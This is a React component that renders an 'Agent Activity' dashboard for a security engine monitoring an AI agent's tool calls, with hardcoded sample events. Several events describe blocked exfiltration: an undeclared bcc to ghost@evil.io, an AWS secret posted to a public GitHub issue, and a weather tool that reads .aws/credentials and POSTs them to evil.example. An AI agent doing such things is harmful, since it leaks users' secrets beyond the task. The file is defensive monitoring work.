import React, { useState } from 'react';
import { CheckCircle, XCircle, AlertTriangle, ChevronDown } from 'lucide-react';

const EVENTS = [
  { id: 'c001', time: '00:13:38', tool: 'filesystem.read_file', args: 'path: "src/auth.js"',   cp: 1, risk: 'LOW',      decision: 'ALLOW' },
  { id: 'c002', time: '00:13:39', tool: 'filesystem.read_file', args: 'path: "src/login.js"',  cp: 1, risk: 'LOW',      decision: 'ALLOW' },
  { id: 'c003', time: '00:13:40', tool: 'filesystem.run_tests', args: '{}',                     cp: 1, risk: 'LOW',      decision: 'ALLOW' },
  { id: 'c004', time: '00:13:41', tool: 'filesystem.read_file', args: 'path: ".env"',           cp: 1, risk: 'MEDIUM',   decision: 'WARN',  detail: 'Credential file access outside declared task scope. Task: fix login bug does not require .env access.' },
  { id: 'c005', time: '00:13:42', tool: 'mailer.send_email',    args: 'to: alice@acme.com',     cp: 1, risk: 'LOW',      decision: 'ALLOW' },
  { id: 'c006', time: '00:13:42', tool: 'mailer.send_email ⚡ EFFECT', args: 'bcc: ghost@evil.io — undeclared', cp: 2, risk: 'HIGH', decision: 'BLOCK', detail: 'Atom: ghost@evil.io found in actual POST body but not in declared arguments. Undeclared recipient → request dropped.' },
  { id: 'c007', time: '00:13:55', tool: 'github.create_issue',  args: 'body: "AWS_SECRET_ACCESS_KEY=..."', cp: 1, risk: 'CRITICAL', decision: 'BLOCK', detail: 'SECRET data (AWS credential) → PUBLIC GitHub destination. Policy 1: SECRET → PUBLIC = BLOCK. Task relevance: NONE.' },
  { id: 'c008', time: '00:14:00', tool: 'browser.fetch',        args: 'url: webpage.example',   cp: 1, risk: 'LOW',      decision: 'ALLOW' },
  { id: 'c009', time: '00:14:01', tool: 'filesystem.read_file', args: 'path: "src/app.js"',     cp: 1, risk: 'LOW',      decision: 'ALLOW' },
  { id: 'c010', time: '00:14:02', tool: 'browser.get_weather',  args: 'city: Bengaluru',         cp: 1, risk: 'LOW',      decision: 'ALLOW' },
  { id: 'c011', time: '00:14:02', tool: 'browser.get_weather ⚡ EFFECT', args: 'fs.open(".aws/credentials") → POST evil.example', cp: 2, risk: 'CRITICAL', decision: 'BLOCK', detail: 'Read-only tool read .aws/credentials (unexpected file read) and attempted POST to evil.example/webhook. Payload matches secret file contents. CRITICAL.' },
  { id: 'c012', time: '00:14:15', tool: 'github.search_repo',   args: 'query: "auth bug"',      cp: 1, risk: 'LOW',      decision: 'ALLOW' },
];

const RISK_PILL = { LOW: 'pill-ghost', MEDIUM: 'pill-amber', HIGH: 'pill-red', CRITICAL: 'pill-red' };
const FILTERS = ['ALL', 'ALLOWED', 'WARNINGS', 'BLOCKED', 'CRITICAL'];

export default function AgentActivity() {
  const [filter, setFilter] = useState('ALL');
  const [expanded, setExpanded] = useState(null);

  const rows = EVENTS.filter(e => {
    if (filter === 'ALLOWED') return e.decision === 'ALLOW';
    if (filter === 'WARNINGS') return e.decision === 'WARN';
    if (filter === 'BLOCKED') return e.decision === 'BLOCK';
    if (filter === 'CRITICAL') return e.risk === 'CRITICAL';
    return true;
  });

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
      <div className="sec-head">
        <div>
          <div className="sec-title">Agent Activity</div>
          <div className="sec-sub">All tool calls processed by the security engine</div>
        </div>
        <div style={{ display: 'flex', gap: 4 }}>
          {FILTERS.map(f => (
            <button
              key={f}
              className={`btn btn-sm ${filter === f ? 'btn-primary' : 'btn-ghost'}`}
              onClick={() => setFilter(f)}
            >
              {f}
            </button>
          ))}
        </div>
      </div>

      <div className="card" style={{ overflow: 'hidden' }}>
        <table className="tbl">
          <thead>
            <tr>
              <th>Time</th>
              <th>Call ID</th>
              <th>Tool</th>
              <th>CP</th>
              <th>Risk</th>
              <th>Decision</th>
              <th />
            </tr>
          </thead>
          <tbody>
            {rows.map(ev => (
              <React.Fragment key={ev.id}>
                <tr
                  style={{ cursor: ev.detail ? 'pointer' : 'default' }}
                  onClick={() => ev.detail && setExpanded(expanded === ev.id ? null : ev.id)}
                >
                  <td><span className="mono">{ev.time}</span></td>
                  <td><span className="tag">{ev.id}</span></td>
                  <td><span className="mono" style={{ fontSize: 11 }}>{ev.tool}</span></td>
                  <td>
                    <span className={`pill ${ev.cp === 2 ? 'pill-ghost' : 'pill-blue'}`} style={{ fontSize: 9 }}>CP{ev.cp}</span>
                  </td>
                  <td>
                    <span className={`pill ${RISK_PILL[ev.risk]}`} style={{ fontSize: 9 }}>{ev.risk}</span>
                  </td>
                  <td>
                    <div style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                      {ev.decision === 'ALLOW' && <CheckCircle size={12} color="var(--green)" />}
                      {ev.decision === 'WARN'  && <AlertTriangle size={12} color="var(--amber)" />}
                      {ev.decision === 'BLOCK' && <XCircle size={12} color="var(--red-text)" />}
                      <span style={{
                        fontSize: 11,
                        fontWeight: 600,
                        color: ev.decision === 'ALLOW' ? 'var(--green)' : ev.decision === 'WARN' ? 'var(--amber)' : 'var(--red-text)',
                      }}>
                        {ev.decision}
                      </span>
                    </div>
                  </td>
                  <td>
                    {ev.detail && (
                      <ChevronDown
                        size={12}
                        color="var(--t-4)"
                        style={{ transition: '160ms', transform: expanded === ev.id ? 'rotate(180deg)' : 'none' }}
                      />
                    )}
                  </td>
                </tr>
                {expanded === ev.id && (
                  <tr>
                    <td colSpan={7} style={{ padding: '2px 12px 10px' }}>
                      <div style={{
                        padding: '10px 13px',
                        borderRadius: 'var(--r-md)',
                        background: ev.decision === 'BLOCK' ? 'var(--red-bg)' : 'var(--amber-bg)',
                        border: `1px solid ${ev.decision === 'BLOCK' ? 'var(--red-bd)' : 'var(--amber-bd)'}`,
                        animation: 'slideIn 0.16s ease',
                      }}>
                        <div style={{ fontSize: 11, fontWeight: 600, color: ev.decision === 'BLOCK' ? 'var(--red-text)' : 'var(--amber)', marginBottom: 5 }}>
                          {ev.decision === 'BLOCK' ? 'Block reason' : 'Warning detail'}
                        </div>
                        <div style={{ fontSize: 11, color: 'var(--t-2)', lineHeight: 1.6, marginBottom: 6 }}>{ev.detail}</div>
                        <div className="mono" style={{ fontSize: 10, color: 'var(--t-3)' }}>{ev.args}</div>
                      </div>
                    </td>
                  </tr>
                )}
              </React.Fragment>
            ))}
          </tbody>
        </table>
      </div>
    </div>
  );
}
